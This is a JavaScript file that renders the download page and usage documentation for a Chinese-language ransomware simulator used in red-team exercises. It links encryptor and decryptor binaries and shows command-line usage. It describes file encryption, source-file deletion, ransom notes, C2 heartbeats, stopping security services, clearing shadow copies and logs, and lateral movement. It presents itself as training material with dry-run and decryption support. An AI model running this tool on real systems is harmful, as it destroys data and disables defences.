                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-gray-200 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="apple" class="w-7 h-7 text-gray-700"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">macOS</h3>
                            <p class="text-xs text-gray-500 mt-1">勒索模拟程序</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="hard-drive" class="w-3.5 h-3.5"></i>
                            <span>通用二进制</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_macos" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-gray-700 to-gray-800 text-white rounded-lg hover:from-gray-800 hover:to-gray-900 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 macOS 版</span>
                        </a>
                    </div>
                </div>
                <h2 class="text-xl font-semibold text-gray-700 text-center mb-6 mt-10">🔓 解密组件</h2>
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-5 mb-10 max-w-xl mx-auto">
                    <!-- 解密程序 Windows -->
                    <div class="relative border border-green-200 rounded-xl p-6 bg-gradient-to-b from-green-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-green-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="monitor" class="w-7 h-7 text-green-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Windows 解密程序</h3>
                            <p class="text-xs text-gray-500 mt-1">命令行解密工具</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="hard-drive" class="w-3.5 h-3.5"></i>
                            <span>x86_64 .exe</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/decryptor.exe" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 .exe</span>
                        </a>
                    </div>
                    <!-- 在线解密 -->
                    <div class="relative border border-blue-200 rounded-xl p-6 bg-gradient-to-b from-blue-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-blue-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="unlock" class="w-7 h-7 text-blue-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">在线解密</h3>
                            <p class="text-xs text-gray-500 mt-1">浏览器本地解密</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="globe" class="w-3.5 h-3.5"></i>
                            <span>Web Crypto API</span>
                        </div>
                        <a href="/decrypt" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg hover:from-blue-700 hover:to-blue-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto">
                            <i data-lucide="arrow-right" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">打开解密页面</span>
                        </a>
                    </div>
                </div>
                <h2 class="text-xl font-semibold text-gray-700 text-center mb-2 mt-4 flex items-center justify-center gap-2">
                    <i data-lucide="cpu" class="w-5 h-5 text-gray-600"></i> ARM 架构版本
                </h2>
                <p class="text-xs text-gray-500 text-center mb-6">适用于 Windows on ARM、ARM64 服务器、树莓派等 ARMv7 设备与 Apple Silicon Mac</p>
                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 mb-10">
                    <!-- Windows ARM64 -->
                    <div class="relative border border-blue-200 rounded-xl p-6 bg-gradient-to-b from-blue-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-blue-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARM64</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-blue-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="monitor" class="w-7 h-7 text-blue-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Windows ARM64</h3>
                            <p class="text-xs text-gray-500 mt-1">Windows on ARM 加密端</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="hard-drive" class="w-3.5 h-3.5"></i>
                            <span>ARM64 .exe</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_arm64.exe" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg hover:from-blue-700 hover:to-blue-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 ARM64 .exe</span>
                        </a>
                    </div>
                    <!-- Linux arm64 动态 -->
                    <div class="relative border border-amber-200 rounded-xl p-6 bg-gradient-to-b from-amber-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-amber-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARM64</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-amber-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="terminal" class="w-7 h-7 text-amber-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Linux arm64</h3>
                            <p class="text-xs text-gray-500 mt-1">aarch64 动态链接版</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="cpu" class="w-3.5 h-3.5"></i>
                            <span>aarch64 ELF</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_linux_arm64" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-amber-500 to-amber-600 text-white rounded-lg hover:from-amber-600 hover:to-amber-700 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 arm64 动态版</span>
                        </a>
                    </div>
                    <!-- Linux arm64 静态 -->
                    <div class="relative border border-emerald-200 rounded-xl p-6 bg-gradient-to-b from-emerald-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-emerald-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARM64</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-emerald-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="box" class="w-7 h-7 text-emerald-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Linux arm64</h3>
                            <p class="text-xs text-gray-500 mt-1">aarch64 静态编译版</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="package" class="w-3.5 h-3.5"></i>
                            <span>静态 aarch64</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_linux_arm64_static" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-emerald-600 to-emerald-700 text-white rounded-lg hover:from-emerald-700 hover:to-emerald-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 arm64 静态版</span>
                        </a>
                    </div>
                    <!-- Linux armv7 动态 -->
                    <div class="relative border border-violet-200 rounded-xl p-6 bg-gradient-to-b from-violet-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-violet-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARMv7</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-violet-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="cpu" class="w-7 h-7 text-violet-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Linux armv7</h3>
                            <p class="text-xs text-gray-500 mt-1">32 位 ARM 动态链接版</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="cpu" class="w-3.5 h-3.5"></i>
                            <span>armv7 ELF</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_linux_arm" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-violet-600 to-violet-700 text-white rounded-lg hover:from-violet-700 hover:to-violet-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 armv7 动态版</span>
                        </a>
                    </div>
                    <!-- Linux armv7 静态 -->
                    <div class="relative border border-teal-200 rounded-xl p-6 bg-gradient-to-b from-teal-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-teal-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARMv7</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-teal-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="package" class="w-7 h-7 text-teal-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Linux armv7</h3>
                            <p class="text-xs text-gray-500 mt-1">32 位 ARM 静态编译版</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="cpu" class="w-3.5 h-3.5"></i>
                            <span>静态 armv7</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_linux_arm_static" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-teal-600 to-teal-700 text-white rounded-lg hover:from-teal-700 hover:to-teal-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 armv7 静态版</span>
                        </a>
                    </div>
                    <!-- macOS Apple Silicon -->
                    <div class="relative border border-gray-300 rounded-xl p-6 bg-gradient-to-b from-gray-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-gray-700 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARM64</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-gray-200 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="apple" class="w-7 h-7 text-gray-700"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">macOS arm64</h3>
                            <p class="text-xs text-gray-500 mt-1">Apple Silicon 单架构加密端</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="hard-drive" class="w-3.5 h-3.5"></i>
                            <span>arm64 Mach-O</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_macos_arm64" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-gray-700 to-gray-800 text-white rounded-lg hover:from-gray-800 hover:to-gray-900 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 macOS arm64</span>
                        </a>
                    </div>
                </div>
                <h3 class="text-lg font-semibold text-gray-700 text-center mb-6">ARM 解密组件</h3>
                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5 mb-10">
                    <!-- Windows ARM64 解密 -->
                    <div class="relative border border-green-200 rounded-xl p-6 bg-gradient-to-b from-green-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-green-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARM64</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-green-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="monitor" class="w-7 h-7 text-green-600"></i>
                            </div>
                            <h3 class="text-base font-semibold text-gray-800">Windows ARM64</h3>
                            <p class="text-xs text-gray-500 mt-1">命令行解密工具</p>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/decryptor_arm64.exe" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 ARM64 .exe</span>
                        </a>
                    </div>
                    <!-- Linux arm64 解密 -->
                    <div class="relative border border-green-200 rounded-xl p-6 bg-gradient-to-b from-green-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-green-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARM64</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-green-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="terminal" class="w-7 h-7 text-green-600"></i>
                            </div>
                            <h3 class="text-base font-semibold text-gray-800">Linux arm64</h3>
                            <p class="text-xs text-gray-500 mt-1">aarch64 解密工具</p>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/decryptor_linux_arm64" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 arm64 版</span>
                        </a>
                    </div>
                    <!-- Linux armv7 解密 -->
                    <div class="relative border border-green-200 rounded-xl p-6 bg-gradient-to-b from-green-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-green-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARMv7</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-green-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="cpu" class="w-7 h-7 text-green-600"></i>
                            </div>
                            <h3 class="text-base font-semibold text-gray-800">Linux armv7</h3>
                            <p class="text-xs text-gray-500 mt-1">32 位 ARM 解密工具</p>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/decryptor_linux_arm" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 armv7 版</span>
                        </a>
                    </div>
                    <!-- macOS arm64 解密 -->
                    <div class="relative border border-green-200 rounded-xl p-6 bg-gradient-to-b from-green-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-green-600 text-white text-xs px-2 py-0.5 rounded-full font-semibold">ARM64</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-green-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="apple" class="w-7 h-7 text-green-600"></i>
                            </div>
                            <h3 class="text-base font-semibold text-gray-800">macOS arm64</h3>
                            <p class="text-xs text-gray-500 mt-1">Apple Silicon 解密工具</p>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/decryptor_macos_arm64" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 macOS arm64</span>
                        </a>
                    </div>
                </div>
                <h2 class="text-xl font-semibold text-gray-700 text-center mb-6">相关链接</h2>
                <div class="flex flex-col sm:flex-row border-2 border-gray-400 rounded overflow-hidden max-w-2xl mx-auto">
                    <a href="https://git.yangzifun.org/YZFN/ransom_simulator" target="_blank" class="flex-1 flex items-center justify-center px-6 py-3 bg-[#609926] text-white hover:bg-[#4a7a1e] transition-colors"><svg class="w-5 h-5 mr-3" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M5 4h16c2.2 0 4 1.8 4 4v10c0 2.2-1.8 4-4 4h-3l-2 4h-4l-2-4H5c-2.2 0-4-1.8-4-4V8c0-2.2 1.8-4 4-4z"/></svg><span class="text-sm font-medium">项目代码</span></a>
                    <a href="/docs" class="flex-1 flex items-center justify-center px-6 py-3 bg-gray-200 text-gray-700 border-0 sm:border-l-2 border-gray-400 hover:bg-gray-300 transition-colors"><i data-lucide="book" class="w-5 h-5 mr-3"></i><span class="text-sm font-medium">使用说明</span></a>
                </div>
            </div>

            <div class="mt-10 text-center text-gray-500 text-sm">
                <p>Powered by <a href="https://www.yangzihome.space" class="text-gray-600 hover:text-gray-800 transition-colors">YZFN</a> | <a href="https://www.yangzihome.space/security.html" class="text-gray-600 hover:text-gray-800 transition-colors">安全声明</a> | <a href="/admin" class="text-gray-600 hover:text-gray-800 transition-colors">终端管理</a></p>
            </div>
        </div>
    </div>
    <script>${CLIENT_SCRIPT}</script>
</body>
</html>
    `;
}

// ===================================================================================
// 第三部分：使用说明页面
// ===================================================================================

function getDocsPage() {
    return String.raw`<!DOCTYPE html>
<html lang="zh-CN" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>使用说明 - 勒索软件模拟器 v3.8</title>
    <link rel="icon" href="https://s3.yangzifun.org/logo.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
      html { scroll-behavior: smooth; }
      body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif; }
      section { scroll-margin-top: 96px; }
      .doc-table th, .doc-table td { border-color: #e5e7eb; }
      .toc-link { display:block; padding: 4px 0; color:#6b7280; }
      .toc-link:hover { color:#111827; }
    </style>
</head>
<body class="bg-white text-gray-700">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
        <div class="flex flex-wrap items-center justify-between gap-4 mb-8 pb-6 border-b border-gray-200">
            <div class="flex items-center">
                <i data-lucide="book-open" class="w-9 h-9 mr-3 text-gray-600"></i>
                <div>
                    <h1 class="text-3xl font-bold text-gray-800">使用说明</h1>
                    <p class="text-sm text-gray-500 mt-1">勒索软件模拟器 v3.8 · 参数、定时任务、密钥、解密、心跳与常见问题</p>
                </div>
            </div>
            <div class="flex flex-wrap items-center gap-3">
                <a href="/" class="inline-flex items-center px-4 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">
                    <i data-lucide="arrow-left" class="w-4 h-4 mr-2"></i>返回首页
                </a>
                <a href="/decrypt" class="inline-flex items-center px-4 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">
                    <i data-lucide="unlock" class="w-4 h-4 mr-2"></i>在线解密
                </a>
                <a href="/admin" class="inline-flex items-center px-4 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50">
                    <i data-lucide="monitor-check" class="w-4 h-4 mr-2"></i>终端管理
                </a>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-[220px_minmax(0,1fr)] gap-10">
            <aside class="hidden lg:block">
                <nav class="sticky top-8 border-l border-gray-200 pl-4 text-sm">
                    <div class="text-xs uppercase tracking-wider text-gray-400 mb-3">目录</div>
                    <a class="toc-link" href="#safety">0. 安全声明</a>
                    <a class="toc-link" href="#download">1. 下载与平台</a>
                    <a class="toc-link" href="#quickstart">2. 快速开始</a>
                    <a class="toc-link" href="#features">3. 功能概览</a>
                    <a class="toc-link" href="#attackchain">4. 攻击链与 ATT&CK</a>
                    <a class="toc-link" href="#scenarios">5. 使用场景大全</a>
                    <a class="toc-link" href="#params">6. 参数详解</a>
                    <a class="toc-link" href="#keys">7. 密钥机制</a>
                    <a class="toc-link" href="#guardrails">8. 演习与护栏</a>
                    <a class="toc-link" href="#schedule">9. 定时任务与后台</a>
                    <a class="toc-link" href="#heartbeat">10. 心跳与管理后台</a>
                    <a class="toc-link" href="#recon">11. 侦察与远程</a>
                    <a class="toc-link" href="#decrypt">12. 解密与恢复</a>
                    <a class="toc-link" href="#logging">13. 日志与文件识别</a>
                    <a class="toc-link" href="#platformapi">14. 平台服务与 API</a>
                    <a class="toc-link" href="#faq">15. 常见问题</a>
                    <a class="toc-link" href="#legal">16. 合规声明</a>
                </nav>
            </aside>

            <main class="min-w-0">
                <section id="safety" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">0. 安全声明</h2>
                    <div class="border-l-4 border-red-400 bg-red-50 text-red-800 text-sm p-4 rounded mb-4">
                        <p class="font-semibold mb-1">本工具仅用于已授权的安全培训、红队演练与防御研究。</p>
                        <p>严禁用于非法用途；请仅在隔离环境中运行，并提前备份重要数据。</p>
                    </div>
                    <ul class="list-disc pl-5 space-y-1 text-sm leading-7 text-gray-600">
                        <li>默认建议先使用 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dry-run</code> 演习模式，只列出目标、不修改文件。</li>
                        <li>非演习模式会执行破坏性模拟（停止服务、清理日志、终止进程），并修改桌面壁纸、写入勒索信。</li>
                        <li><code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-remove</code> 会删除源文件，风险最高，请确认后再使用。</li>
                        <li>远程扫描与横向编排仅可在你拥有合法授权的网络中使用。</li>
                    </ul>
                </section>

                <section id="download" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">1. 下载与平台选择</h2>
                    <p class="text-sm leading-7 text-gray-600 mb-3">到首页下载对应架构的加密端与解密端。不确定时按下表选择：</p>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr>
                                    <th class="text-left px-3 py-2 border-b border-r">平台</th>
                                    <th class="text-left px-3 py-2 border-b border-r">文件</th>
                                    <th class="text-left px-3 py-2 border-b">适用场景</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r">Windows x64</td><td class="px-3 py-2 border-b border-r font-mono text-[13px]">ransom_simulator.exe</td><td class="px-3 py-2 border-b">常见 Intel/AMD Windows</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">Windows ARM64</td><td class="px-3 py-2 border-b border-r font-mono text-[13px]">ransom_simulator_arm64.exe</td><td class="px-3 py-2 border-b">Windows on ARM（骁龙本等）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">Linux x86_64</td><td class="px-3 py-2 border-b border-r font-mono text-[13px]">ransom_simulator_linux(_static)</td><td class="px-3 py-2 border-b">普通 x86_64 服务器；静态版用于缺少 glibc 的环境</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">Linux arm64</td><td class="px-3 py-2 border-b border-r font-mono text-[13px]">ransom_simulator_linux_arm64(_static)</td><td class="px-3 py-2 border-b">ARM64 云主机、树莓派 4/5 64 位系统</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">Linux armv7</td><td class="px-3 py-2 border-b border-r font-mono text-[13px]">ransom_simulator_linux_arm(_static)</td><td class="px-3 py-2 border-b">32 位 ARM 设备（部分树莓派/嵌入式）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">macOS</td><td class="px-3 py-2 border-b border-r font-mono text-[13px]">ransom_simulator_macos(_arm64)</td><td class="px-3 py-2 border-b">通用二进制适配 Intel 与 Apple Silicon</td></tr>
                            </tbody>
                        </table>
                    </div>
                    <p class="text-sm leading-7 text-gray-600">Linux/macOS 下载后需要执行权限：</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>chmod +x ransom_simulator_linux
./ransom_simulator_linux -dry-run</code></pre>
                </section>

                <section id="quickstart" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">2. 快速开始</h2>
                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">2.1 演习模式（推荐首次使用）</h3>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
ransom_simulator.exe -dry-run -dir="D:\test" -log

# Linux / macOS
./ransom_simulator_linux -dry-run -dir="/tmp/test" -log</code></pre>
                    <p class="text-sm leading-7 text-gray-600 mb-3">演习模式只扫描并列出将被加密的文件，不修改任何文件、不停止服务、不改壁纸。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">2.2 指定目标与扩展名</h3>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 指定目录（该目录下所有格式都会被处理）
ransom_simulator.exe -dir="D:\test" -log

# 指定扩展名（多目录用逗号分隔）
ransom_simulator.exe -dir="D:\test" -ext=".txt,.docx,.pdf" -workers=8 -log</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">2.3 加密后删除源文件</h3>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test" -remove -log</code></pre>
                    <div class="border-l-4 border-amber-400 bg-amber-50 text-amber-800 text-sm p-4 rounded mb-4">
                        <p><code class="font-mono">-remove</code> 不可恢复地删除源文件，请确保已在隔离环境并做好备份。</p>
                    </div>
                </section>

                <section id="features" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">3. 功能概览</h2>
                    <p class="text-sm leading-7 text-gray-600 mb-3">勒索软件模拟器（ransom_simulator）用于红队演练和防御研究，模拟真实勒索软件的完整攻击链：文件加密、勒索信、桌面壁纸、C2 通信、定时触发、攻击面侦察与远程横向编排。项目遵循 MIT 许可证。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">3.1 核心能力</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">能力</th><th class="text-left px-3 py-2 border-b">说明</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r">混合加密</td><td class="px-3 py-2 border-b">RSA-2048（OAEP）包裹 AES-256-GCM 会话密钥；每个文件独立随机密钥</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">多平台</td><td class="px-3 py-2 border-b">Windows（x64 / ARM64）、Linux（x86_64 / arm64 / armv7，动态与静态）、macOS（通用二进制 / arm64）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">并发加密</td><td class="px-3 py-2 border-b">多 worker 线程并发；<code class="text-[12px]">-workers</code> 控制并发度</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">大文件部分加密</td><td class="px-3 py-2 border-b">超过 1GB 的文件自动采用“头部 + 尾部 + 随机中间块”策略，兼顾速度与演示效果</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">密钥获取</td><td class="px-3 py-2 border-b">API 优先，失败自动回退本地公钥；支持离线与用户级缓存</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">浏览器解密</td><td class="px-3 py-2 border-b">在 <a href="/decrypt" class="text-blue-600 underline">/decrypt</a> 用 Web Crypto API 本地解密，文件与私钥不上传</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">3.2 勒索与演练能力</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">能力</th><th class="text-left px-3 py-2 border-b">说明</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r">勒索信</td><td class="px-3 py-2 border-b">中/英文模板，每个加密目录自动投放；文案随 <code class="text-[12px]">-remove</code> 变化</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">桌面壁纸</td><td class="px-3 py-2 border-b">加密完成后本地生成勒索提示壁纸并设为桌面背景（Windows PowerShell / Linux 标准库 / macOS osascript）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 2 破坏模拟</td><td class="px-3 py-2 border-b">停止数据库/安全服务、清理缓存、终止占用进程、清理卷影与日志；均可用参数跳过</td></tr>
